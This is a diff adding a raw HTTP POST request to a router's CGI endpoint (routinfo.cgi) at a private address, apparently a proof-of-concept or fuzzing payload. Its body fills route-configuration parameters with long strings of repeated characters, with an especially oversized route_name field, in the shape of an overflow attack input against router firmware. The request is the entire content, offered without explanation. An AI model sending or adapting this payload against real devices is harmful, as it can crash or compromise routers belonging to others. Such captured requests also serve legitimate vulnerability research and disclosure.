@@ -1,0 +1,6 @@
+POST /routinfo.cgi?st_dhcp.cgi HTTP/1.1
+HOST: 192.168.0.50
+Content-Type: text/html
+Content-Length: 541
+
+test=22222222&BAK_backup.htm=22222222222222222222222222222222&STR_routes.htm=1&no_space_add_static_routes=22222222222222222222222222222222&select=1&port_edit=22222222222222222222222222222222&port_del=22222222&static_route=3&route_dest=1&route_gateway=4&route_metric=1&route_active=1&route_private=1&route_name=22222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222&invalid_gateway=1&routes_condition_dup=1&STR_add.htm=1&a_destip=1&invalid_mask=1&routes_metric_error=1
